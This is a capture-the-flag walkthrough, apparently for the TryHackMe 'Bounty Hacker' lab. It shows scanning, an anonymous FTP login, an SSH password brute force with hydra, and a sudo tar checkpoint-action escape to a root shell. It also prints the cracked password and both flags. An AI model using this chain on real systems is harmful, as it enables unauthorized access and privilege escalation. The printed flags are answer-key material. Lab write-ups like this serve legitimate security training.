$   sudo nmap -Pn -T4 10.10.193.32
    Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 18:41 +0545
    Nmap scan report for 10.10.193.32
    Host is up (0.19s latency).
    Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
    PORT   STATE SERVICE
    21/tcp open  ftp
    22/tcp open  ssh
    80/tcp open  http
====================================
#Let's try anonymous login in ftp port:

$   ftp 10.10.193.32 21
    Connected to 10.10.193.32.
    220 (vsFTPd 3.0.3)
    Name (10.10.193.32:devil): anonymous
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    >

# Login Successfull.
now let's list files:
    ftp> ls
    200 PORT command successful. Consider using PASV.
    150 Here comes the directory listing.
    -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
    -rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
    226 Directory send OK.

==============================

Now let's grab the files and see what's over there.

Found user name lin in the task file.
Found paswords in the locks file.

# let's try to bruteforce ssh with the user lin

  $ hydra -l lin -P locks.txt 10.10.44.81 -t 4 ssh
  [DATA] attacking ssh://10.10.44.81:22/
  [22][ssh] host: 10.10.44.81   login: lin   password: RedDr4gonSynd1cat3
  1 of 1 target successfully completed, 1 valid password found

# Found the password: "RedDr4gonSynd1cat3" for user: "lin"

=================================

# Now let's try loggin in using ssh:
  $ssh lin@10.10.44.81
  
# Successfully loged in as lin:
    lin@bountyhacker:~/Desktop$

=================================

# now let's look for user flag:

    lin@bountyhacker:~/Desktop$ ls
    user.txt

# Found the user flag:

    lin@bountyhacker:~/Desktop$ cat user.txt
    THM{CR1M3_SyNd1C4T3}

=================================

# Now let's try to get root flag.

Now let's look for some way to escilate the privilage

after some enumeration in the directories I didn't found any interisting files or directories.

# First let's check if there are any jobs running:
    lin@bountyhacker:~/Desktop$ cat /etc/crontab
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user	command
    17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
    25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    #
=================================

So now let's check our sudo privilages:

    lin@bountyhacker:~/Desktop$ sudo -l
    [sudo] password for lin: 
    Matching Defaults entries for lin on bountyhacker:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User lin may run the following commands on bountyhacker:
        (root) /bin/tar

=================================
# Seems we can use /bin/tar as root.

    Now let's use this binary to get a root shell:

    lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
    tar: Removing leading `/' from member names
    # 

=================================
# Got the shell wowo...

# Now let's take the root flag at /root/root.txt..!

    # cat /root/root.txt
    THM{80UN7Y_h4cK3r}.